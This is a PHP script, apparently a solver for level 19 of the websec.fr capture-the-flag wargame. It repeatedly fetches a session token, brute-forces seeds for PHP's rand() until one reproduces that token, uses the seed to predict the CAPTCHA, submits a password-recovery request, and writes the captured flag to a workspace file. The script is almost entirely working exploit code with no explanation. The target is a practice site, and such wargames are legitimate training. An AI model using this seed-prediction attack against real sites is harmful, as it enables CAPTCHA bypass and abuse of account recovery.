<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    RANDOM WALK ATTACK - Monte Carlo approach              ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$total_attempts = 0;

while (true) {
    // Obtener token
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    echo "Token: " . substr($real_token, 0, 12) . "... | Total: $total_attempts\n";
    
    // Probar 50000 seeds completamente aleatorios
    for ($i = 0; $i < 50000; $i++) {
        // Generar seed aleatorio en diferentes rangos
        $rand_type = mt_rand(0, 4);
        
        switch ($rand_type) {
            case 0:
                // Seed pequeño
                $seed = mt_rand(0, 100000);
                break;
            case 1:
                // Timestamp reciente
                $seed = time() + mt_rand(-86400, 86400);
                break;
            case 2:
                // Timestamp muy antiguo o futuro
                $seed = mt_rand(0, 2147483647);
                break;
            case 3:
                // Seed negativo
                $seed = -mt_rand(1, 2147483647);
                break;
            case 4:
                // Seed basado en microsegundos
                $seed = intval(microtime(true) * 1000) + mt_rand(-1000000, 1000000);
                break;
        }
        
        srand($seed);
        $test_token = generate_random_text(32);
        $total_attempts++;
        
        if ($test_token === $real_token) {
            echo "\n✓✓✓ RANDOM HIT! Seed: $seed ✓✓✓\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\nSUCCESS!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
    }
}
?>